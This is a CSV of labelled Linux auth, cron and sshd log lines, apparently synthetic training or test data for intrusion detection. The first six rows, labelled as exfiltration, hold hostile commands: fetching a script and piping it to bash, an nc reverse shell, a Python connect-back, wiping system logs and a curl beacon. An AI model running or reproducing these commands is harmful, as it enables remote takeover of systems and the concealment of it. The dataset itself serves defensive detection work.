timestamp,src_ip,message,label,attack_type
2024-04-11T08:09:10Z,10.0.0.5,"Apr 11 08:09:10 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -q -O - http://10.10.10.99/c2 | bash",1,Exfiltration
2024-04-11T08:09:15Z,10.0.0.5,"Apr 11 08:09:15 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 10.10.10.99 4444",1,Exfiltration
2024-04-11T08:09:20Z,10.0.0.5,"Apr 11 08:09:20 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c import socket,subprocess,os;s=socket.socket();s.connect((10.10.10.99,4445))",1,Exfiltration
2024-04-11T08:09:25Z,10.0.0.5,"Apr 11 08:09:25 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/echo '' > /var/log/auth.log",1,Exfiltration
2024-04-11T08:09:30Z,10.0.0.5,"Apr 11 08:09:30 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/echo '' > /var/log/syslog",1,Exfiltration
2024-04-11T08:09:35Z,10.0.0.5,"Apr 11 08:09:35 server CRON[3001]: (root) CMD (curl -s http://10.10.10.99/beacon > /dev/null)",1,Exfiltration
2024-04-11T08:10:00Z,192.168.1.10,"Apr 11 08:10:00 server sshd[1040]: Accepted password for alice from 192.168.1.10 port 52500 ssh2",0,NONE
2024-04-11T08:10:10Z,192.168.1.20,"Apr 11 08:10:10 server sudo: bob : COMMAND=/usr/bin/uptime",0,NONE
2024-04-11T08:10:20Z,192.168.1.30,"Apr 11 08:10:20 server systemd: Started Session 5 of user carol",0,NONE
2024-04-11T08:10:30Z,192.168.1.40,"Apr 11 08:10:30 server sudo: dave : COMMAND=/usr/bin/free -m",0,NONE
2024-04-11T08:10:45Z,192.168.1.10,"Apr 11 08:10:45 server CRON[1500]: (alice) CMD (/home/alice/scripts/report.sh)",0,NONE
2024-04-11T08:11:00Z,192.168.1.20,"Apr 11 08:11:00 server sshd[1050]: Accepted password for bob from 192.168.1.20 port 44400 ssh2",0,NONE
2024-04-11T08:11:10Z,192.168.1.30,"Apr 11 08:11:10 server sudo: carol : COMMAND=/usr/bin/ping -c 4 8.8.8.8",0,NONE
2024-04-11T08:11:20Z,192.168.1.40,"Apr 11 08:11:20 server systemd: Stopping User Manager for UID 1003",0,NONE
2024-04-11T08:11:30Z,192.168.1.10,"Apr 11 08:11:30 server sudo: alice : COMMAND=/usr/bin/grep -r error /var/log/nginx",0,NONE
2024-04-11T08:11:45Z,192.168.1.20,"Apr 11 08:11:45 server CRON[1600]: (root) CMD (/usr/bin/certbot renew)",0,NONE
2024-04-11T08:12:00Z,192.168.1.30,"Apr 11 08:12:00 server sshd[1060]: Accepted password for carol from 192.168.1.30 port 61200 ssh2",0,NONE
2024-04-11T08:12:10Z,192.168.1.40,"Apr 11 08:12:10 server sudo: dave : COMMAND=/usr/bin/netstat -tulpn",0,NONE
2024-04-11T08:12:20Z,192.168.1.10,"Apr 11 08:12:20 server systemd: Started Session 6 of user alice",0,NONE
2024-04-11T08:12:30Z,192.168.1.20,"Apr 11 08:12:30 server sudo: bob : COMMAND=/usr/bin/tail -f /var/log/syslog",0,NONE
2024-04-11T08:12:45Z,192.168.1.30,"Apr 11 08:12:45 server CRON[1700]: (carol) CMD (/home/carol/bin/health_check.sh)",0,NONE
2024-04-11T08:13:00Z,192.168.1.40,"Apr 11 08:13:00 server sshd[1070]: Accepted password for dave from 192.168.1.40 port 55300 ssh2",0,NONE
2024-04-11T08:13:10Z,192.168.1.10,"Apr 11 08:13:10 server sudo: alice : COMMAND=/usr/bin/systemctl restart apache2",0,NONE
2024-04-11T08:13:20Z,192.168.1.20,"Apr 11 08:13:20 server systemd: Started Session 7 of user bob",0,NONE
2024-04-11T08:13:30Z,192.168.1.30,"Apr 11 08:13:30 server sudo: carol : COMMAND=/usr/bin/du -sh /var/log",0,NONE
2024-04-11T08:13:45Z,192.168.1.40,"Apr 11 08:13:45 server CRON[1800]: (root) CMD (/usr/bin/updatedb)",0,NONE
